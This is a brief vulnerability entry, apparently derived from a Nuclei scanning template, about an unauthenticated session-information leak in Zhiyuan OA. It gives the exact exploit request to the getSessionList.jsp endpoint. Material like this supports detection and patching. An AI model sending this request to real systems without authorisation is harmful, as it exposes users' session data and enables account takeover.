# Vulnerability: Zhiyuan OA Session Leak
**Classification:** ZHIYUAN
**Source:** Nuclei Template (`zhiyuan-oa-session-leak.yaml`)

## Description
A vulnerability in Zhiyuan OA allows remote unauthenticated users access to sensitive session information via the 'getSessionList.jsp' endpoint.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/yyoa/ext/https/getSessionList.jsp?cmd=getAll
```

